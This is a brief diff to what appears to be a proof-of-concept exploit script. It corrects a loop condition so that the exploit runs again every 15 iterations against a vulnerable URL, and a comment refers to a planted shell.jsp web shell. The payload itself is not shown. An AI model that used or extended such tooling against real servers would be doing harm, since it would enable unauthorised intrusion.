@@ -77,7 +77,7 @@ def main():
     try:
         for i in range(repeat):
             print(f"[*] Performing loop: {i}/{repeat}")
-            if i / 15 == 0 or i == 0:
+            if i % 15 == 0 or i == 0:
                 execute_poc(vuln_url)
             print("[*] Performing reconnaissance")
             # Using PoC shell.jsp is always placed at the root
